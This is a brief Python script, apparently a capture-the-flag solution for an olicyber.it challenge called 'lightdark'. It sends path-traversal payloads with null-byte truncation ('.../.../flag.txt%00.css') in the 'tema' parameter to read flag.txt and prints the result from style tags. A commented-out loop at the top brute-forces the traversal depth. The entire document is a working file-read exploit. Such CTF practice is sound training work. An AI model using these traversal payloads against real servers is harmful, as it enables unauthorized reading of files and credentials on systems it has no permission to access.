#from requests import *
#payload=""
#r=get("http://lightdark.challs.olicyber.it/index.php?tema="+payload)
#for i in range(10):
#    payload=i*"..%2F"+"flag.txt%00.css"
 #   r=get("http://lightdark.challs.olicyber.it/index.php?tema="+payload)
  #  if "flag" in r.text:
   #     print(r.text)
    #    break
import requests
from bs4 import *

site = "http://lightdark.challs.olicyber.it/index.php?tema="
payload = ".../.../.../.../.../flag.txt%00.css" # /static/css/*link* => /flag.txt

r = requests.get(site + payload)
zuppetta = BeautifulSoup(r.text, "html.parser")
for i in zuppetta.find_all("style"):
    print(str(i).replace("<style>", "").replace("</style>", "").replace(" ", "").replace("\n", ""))